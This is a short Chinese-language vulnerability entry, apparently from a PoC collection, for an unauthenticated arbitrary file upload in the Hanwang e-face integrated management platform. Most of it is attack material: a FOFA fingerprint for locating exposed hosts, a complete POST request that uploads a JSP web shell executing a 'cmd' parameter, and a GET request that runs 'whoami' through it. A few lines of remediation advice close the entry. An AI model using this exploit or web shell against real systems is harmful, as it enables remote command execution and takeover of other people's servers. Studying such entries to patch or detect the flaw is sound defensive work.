## 汉王 e 脸通综合管理平台 resourceUploadFile.do 任意文件上传漏洞

## 漏洞描述
汉王 e 脸通综合管理平台的 `resourceUploadFile.do` 接口属于文件下发功能，但未对上传内容做登录校验与扩展名限制，攻击者可以上传任意 JSP 脚本并直接访问执行。

## 网络空间测绘
```
fofa: icon_hash="1380907357"
```

## POC
```
POST /manage/dgmCommand/resourceUploadFile.do?recoToken=ZuB0rvLG8M HTTP/1.1
Host: <target domain>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJZ4P1AZBixjELj
Accept: */*
Connection: close

---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<%@ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); ... %>

---WebKitFormBoundaryFfJZ4P1AZBixjELj--
```

上传成功后访问：
```
GET /manage/resource/2186456f54e24a96a180e39bd30c0307.jsp?cmd=whoami HTTP/1.1
Host: <target domain>
```

## 修复建议
- 上传目录与执行目录隔离，移除执行权限
- 对上传内容进行校验，仅允许图片/文档等安全格式
- 接口增加鉴权和临时授权令牌

## 参考
- 社区爆料

